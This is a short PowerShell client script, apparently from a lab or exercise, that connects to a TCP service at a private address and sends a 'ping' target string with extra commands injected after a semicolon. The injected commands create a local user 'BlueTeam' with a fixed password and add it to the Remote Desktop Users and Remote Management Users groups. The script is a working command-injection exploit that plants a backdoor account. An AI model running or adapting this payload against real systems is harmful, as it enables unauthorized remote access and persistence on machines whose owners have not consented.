# Client Script
# Define the IP address and port of the machine where your service is running
$ipAddress = '172.31.24.25'  
$port = 1234 
# Define the IP address you want to ping and add a new user that has remote desktop access.
$pingIpAddress = "172.31.24.15; New-LocalUser -Name 'BlueTeam' -Password (ConvertTo-SecureString -AsPlainText 'Passw0rd!' -Force); Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'BlueTeam'; Add-LocalGroupMember -Group 'Remote Management Users' -Member 'BlueTeam';"
# Create a TcpClient object
$client = New-Object System.Net.Sockets.TcpClient
# Connect to the remote machine
$client.Connect($ipAddress, $port)
# Get the client's stream
$stream = $client.GetStream()
# Create a StreamWriter object to write to the stream
$writer = New-Object System.IO.StreamWriter($stream)
# Create a StreamReader to read from the stream
$reader = New-Object System.IO.StreamReader($stream)
# Write the IP address to the stream
$writer.WriteLine($pingIpAddress)
$writer.Flush()
# Read the result from the stream until the stream is empty
$result = while ($reader.Peek() -ne -1) { $reader.ReadLine() }
# Print the result
Write-Output $result
# Close the connection
$client.Close()

